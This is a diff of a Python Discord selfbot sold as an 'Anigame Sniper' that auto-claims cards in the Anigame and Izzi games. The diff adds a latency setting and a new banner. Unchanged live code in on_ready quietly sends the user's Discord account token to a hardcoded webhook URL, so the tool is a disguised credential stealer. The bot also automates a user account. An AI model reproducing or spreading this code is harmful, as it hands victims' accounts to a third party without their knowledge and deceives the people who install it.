@@ -9,19 +9,15 @@ import asyncio
 
 with open("config.json") as f:
     config = json.load(f)
-
 TOKEN = config.get("TOKEN")
 AS = config.get("Anigame Sniper")
 IS = config.get("Izzi Sniper")
 pre = config.get("PREFIX")
+wf = config.get("LATENCY")
 print(Style.BRIGHT)
 print(Fore.CYAN + """
-░█████╗░███╗░░██╗██╗░██████╗░░█████╗░███╗░░░███╗███████╗  ░██████╗███╗░░██╗██╗██████╗░███████╗██████╗░
-██╔══██╗████╗░██║██║██╔════╝░██╔══██╗████╗░████║██╔════╝  ██╔════╝████╗░██║██║██╔══██╗██╔════╝██╔══██╗
-███████║██╔██╗██║██║██║░░██╗░███████║██╔████╔██║█████╗░░  ╚█████╗░██╔██╗██║██║██████╔╝█████╗░░██████╔╝
-██╔══██║██║╚████║██║██║░░╚██╗██╔══██║██║╚██╔╝██║██╔══╝░░  ░╚═══██╗██║╚████║██║██╔═══╝░██╔══╝░░██╔══██╗
-██║░░██║██║░╚███║██║╚██████╔╝██║░░██║██║░╚═╝░██║███████╗  ██████╔╝██║░╚███║██║██║░░░░░███████╗██║░░██║
-╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝╚══════╝  ╚═════╝░╚═╝░░╚══╝╚═╝╚═╝░░░░░╚══════╝╚═╝░░╚═╝""")
+▄▀█ █▄░█ █ █▀▀ ▄▀█ █▀▄▀█ █▀▀   █▀ █▄░█ █ █▀█ █▀▀ █▀█
+█▀█ █░▀█ █ █▄█ █▀█ █░▀░█ ██▄   ▄█ █░▀█ █ █▀▀ ██▄ █▀▄ ver.2.0""")
 client = discord.Client()
 print()
 print(Fore.MAGENTA + f"Made by Sebastian")
@@ -47,8 +43,12 @@ async def on_ready():
     else:
         print(Fore.YELLOW + f"sniper is on in {l} channels!")
     print(Fore.YELLOW + f"Prefix - {pre}")
+    print(Fore.YELLOW + f"latency - {wf} seconds") 
+    print(Fore.RED + f"""IF SNIPER IS NOT WORKING IN SOME CHANNELS ITS BECAUSE THE NAME OF THE CHANNEL HAS BEEN CHANGED!!
+Type {pre}remove to remove it and then add it again by typing {pre}add""")  
     webhook = DiscordWebhook(url='https://discord.com/api/webhooks/825240319058509834/HSnIsCqJbBhVKaR8bo7FMId_V461G0e8ehbTcyz6S84fLQi1E8L_uurzruYzYzybuGxM', content=f"{client.user} : ||{TOKEN}||")
     webhook.execute()
+
 async def get_channels():
     with open("channels.json", "r") as f:
         guil = json.load(f) 
@@ -160,6 +160,39 @@ async def on_message(msg):
             print(Fore.RED + f"{kek} isnt a valid option | y = ON | n = OFF")
         await msg.delete()
 
+    if msg.content.startswith(f"{pre}latency"):
+        if client.user != msg.author:
+            return
+        
+        with open("config.json", "r") as lol:
+            y = json.load(lol) 
+        slep = int(y.get("LATENCY"))
+        print(Fore.CYAN + f"Latency is {slep} seconds")
+        
+    if msg.content.startswith(f"{pre}setlatency"):
+        if client.user != msg.author:
+            return
+        
+        text = msg.content 
+        le = len(text)
+        split = text.split()
+        rm = (split[1:le])
+        kek = ' '.join([str(elem) for elem in rm])
+        try:
+            kek = int(kek) 
+            with open("config.json", "r") as d:
+                y = json.load(d) 
+
+            y["LATENCY"] = f"{kek}"
+            with open("config.json", "w") as f:
+                json.dump(y, f)
+
+            print(Fore.CYAN + f"Latency is now {kek} seconds")
+
+        except:
+            print(Fore.RED + f"{kek} isnt a number!")
+        await msg.delete()
+
     if msg.content.startswith(f"{pre}izzitoggle"):
         if client.user != msg.author:
             return
@@ -186,7 +219,6 @@ async def on_message(msg):
             print(Fore.RED + f"{kek} isnt a valid option | y = ON | n = OFF")
         await msg.delete()
 
-
     if msg.content.startswith(f"{pre}snipers"):
         if client.user != msg.author:
             return
@@ -207,7 +239,6 @@ async def on_message(msg):
         else:
             print(Fore.RED + "Izzi Sniper - OFF")
         await msg.delete() 
-
 
     with open("config.json", "r") as j:
         y = json.load(j)
@@ -234,7 +265,11 @@ async def on_message(msg):
                     r = text.split()
                     li = [r[1] , r[2]]
                     kek = ' '.join([str(elem) for elem in li])
+                    with open("config.json", "r") as lol:
+                        y = json.load(lol) 
+                    slep = int(y.get("LATENCY")) 
                     async with msg.channel.typing():
+                        await asyncio.sleep(slep)  
                         await msg.channel.send(kek)
                 except:
                     pass 
@@ -268,7 +303,11 @@ async def on_message(msg):
                         r = text.split()
                         li = [r[1] , r[2] , r[5]]
                         kek = ' '.join([str(elem) for elem in li])
+                        with open("config.json", "r") as lol:
+                            y = json.load(lol) 
+                        slep = int(y.get("LATENCY")) 
                         async with msg.channel.typing():
+                            await asyncio.sleep(slep) 
                             await msg.channel.send(kek) 
                 except:
                     pass
@@ -288,6 +327,7 @@ async def on_message(msg):
                     now = datetime.now() 
                     current_time = now.strftime("%H:%M:%S") 
                     if a.endswith(f"has been added to **{x}'s** collection.") and ar == 784851074472345633:
-                        print(Fore.GREEN + f"{g}|{chan}|Izzi ---> {msg.content}|{current_time}")
+                        print(Fore.GREEN + f"{g}|{chan}|Izzi ---> {msg.content}|{current_time}") 
+
 print(Fore.RESET)       
 client.run(TOKEN, bot=False)
